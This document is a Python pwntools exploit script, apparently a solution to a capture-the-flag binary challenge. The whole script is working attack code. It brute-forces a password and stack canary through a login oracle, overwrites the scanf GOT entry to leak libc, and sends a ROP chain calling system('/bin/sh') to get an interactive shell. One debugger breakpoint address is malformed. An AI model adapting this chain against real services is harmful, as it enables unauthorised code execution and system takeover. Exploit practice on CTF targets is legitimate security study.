#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 36689
HOST = "127.0.0.1"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x000000000040146B
            b* 0x0000000000401479
            b* 0x00000000004014EC
            b* 0x000000000040158A
            b* 0x0x4013f8
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def login(password):
    p.sendlineafter(b'choice: ', str(1))
    p.sendafter(b'\n', password)

def change(password):
    p.sendlineafter(b'choice: ', str(2))
    p.sendlineafter(b'\n', password)

# VARIABLE
read_addr = 0x401450
gets_addr = 0x4014E0
main = 0x401385
got_scanf = 0x404068

# PAYLOAD
password = b'\xff'
for i in range(7):
    for j in range(1, 256):
        test = password + p8(j)
        login(test + b'\0')
        p.recvuntil(b'Login ')
        output = p.recvuntil(b'!')

        if b'successfully' in output:
            print(f"Byte {i + 1}:" + str(j))
            password += p8(j)
            break

password = password[::-1]
canary = password[0:7]
password = int.from_bytes(password, "big")
log.info("Password: " + hex(password))
canary += b'\0'
canary = int.from_bytes(canary, "big")
log.info("canary: " + hex(canary))

payload = p64(password) + b'\0'*0x30
payload += flat(
    canary,
    got_scanf,
    read_addr,
    )
change(payload)
p.sendlineafter(b'choice: ', str(3))

p.send(b'\0'*8) # __stack_chk_fail
libc_leak = b''
for i in range(6):
    for j in range(1, 256):
        test = libc_leak + p8(j)
        login(test + b'\0')
        p.recvuntil(b'Login ')
        output = p.recvuntil(b'!')

        if b'successfully' in output:
            print(f"Byte {i + 1}:" + str(j))
            libc_leak += p8(j)
            break

libc_leak = libc_leak[::-1]
libc_leak = int.from_bytes(libc_leak, "big")
log.info("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym.puts
log.info("Libc base: " + hex(libc.address))

# read -> main
payload = flat(
    0, libc.sym.printf,
    )
payload += p32(main) + p16(0)
change(payload)
p.sendlineafter(b'choice: ', str(1))

pop_rdi = 0x2a3e5 + libc.address
ret = 0x29139 + libc.address
payload = flat(
    b'\0'*0x38,
    canary,
    b'\0'*8,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    ret,
    libc.sym.system
    )
change(payload)
p.sendlineafter(b'choice: ', str(3))

p.interactive()